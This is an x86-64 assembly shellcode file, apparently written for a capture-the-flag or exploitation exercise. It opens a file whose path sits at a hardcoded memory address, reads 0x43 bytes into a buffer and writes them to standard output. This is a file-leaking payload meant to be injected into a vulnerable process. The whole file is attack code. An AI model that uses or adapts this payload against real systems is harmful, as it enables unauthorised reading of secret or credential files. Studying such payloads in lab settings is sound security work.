;shellcode.asm
[SECTION .text]

global _start

_start:
	mov al, 0x2
	mov rdi, 0x41414060 	; Change the address later according to the length of the shellcode
	xor rsi, rsi		; Zero out the rsi register
	;int 0x80
	syscall
	
	mov r15, rax		; Store the fd in r15
	xor rax, rax		; Set rax to 0 (sys_read)
	mov rdi, r15		; Move the fd to rdi
	mov rsi, 0x41414210
	mov dl, 0x43
	;int 0x80
	syscall

	xor rax, rax
	mov al, 0x1
	xor rdi, rdi
	mov dil, 0x1
	mov rsi, 0x41414210
	mov dl, 0x43
	;int 0x80
	syscall
